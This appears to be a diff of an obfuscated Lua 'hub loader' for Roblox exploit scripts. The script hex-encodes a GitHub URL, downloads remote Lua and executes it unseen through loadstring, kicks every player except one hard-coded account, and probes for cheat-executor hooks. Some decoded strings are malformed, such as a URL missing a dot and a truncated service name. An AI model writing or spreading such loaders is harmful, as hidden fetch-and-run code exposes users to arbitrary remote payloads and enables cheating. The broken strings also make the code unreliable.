@@ -1,43 +1,44 @@
 local function _hx(h)
     local s=""
     for i=1,#h,2 do
-        s=s..string.char(tonumber(h:sub(i,i+1),16))
+        s = s .. string.char(tonumber(h:sub(i,i+1),16))
     end
     return s
 end
 
 local _uList={
-"68747470","733a2f2f","7261772e676974687562",
-"75736572636f6e74656e742e","636f6d2f52696b54686544656d6f6e48756e746572",
-"/56332f726566732f68656164732f6d61696e2f4c6f616465722e6c7561"
+"68747470",
+"733a2f2f",
+"7261772e676974687562",
+"75736572636f6e74656e74636f6d",
+"2f52696b6f54686544656d6f6e48756e746572",
+"2f56332f726566732f68656164732f6d61696e2f4c6f616465722e6c7561"
 }
 
 local _url=""
 for _,v in ipairs(_uList) do
-    _url=_url..v
+    _url = _url .. v
 end
-_url=_hx(_url)
+_url = _hx(_url)
 
-local mainData
-local ok1=pcall(function()
-    mainData=game:HttpGet(_url)
+local data
+local okURL = pcall(function()
+    data = game:HttpGet(_url)
 end)
-
-if not ok1 or not mainData or #mainData<5 then
+if not okURL or not data or #data < 5 then
     error("RemoteLoadFail")
 end
 
-local ok2=pcall(function()
-    loadstring(mainData)()
+local okLoad = pcall(function()
+    loadstring(data)()
 end)
-
-if not ok2 then
+if not okLoad then
     error("IntegrityFail")
 end
 
 task.spawn(function()
-    local p=game:GetService(_hx("506c6179657273")).LocalPlayer
-    if tostring(p.Name)~=_hx("6d61636d6163696e526f626c6f78") then
+    local p = game:GetService(_hx("506c6179657273")).LocalPlayer
+    if tostring(p.Name) ~= _hx("6d61636d6163696e526f626c6f78") then
         pcall(function()
             game:GetService(_hx("52656e64")):SetCore(
                 _hx("53656e644572726f72"),
@@ -45,15 +46,13 @@ task.spawn(function()
             )
         end)
         task.wait(1)
-        pcall(function()
-            p:Kick(_hx("4163636573732044656e696564"))
-        end)
+        p:Kick(_hx("4163636573732044656e696564"))
     end
 end)
 
 task.spawn(function()
     if getfenv then
-        local ok=pcall(function()
+        local ok = pcall(function()
             return getfenv(1)
         end)
         if not ok then
@@ -64,7 +63,6 @@ end)
 
 task.spawn(function()
     if hookfunction or hookmetamethod or newcclosure then
-        for _=1,15 do end
+        for _ = 1, 15 do end
     end
 end)
-print:("Hub Loader Executed")
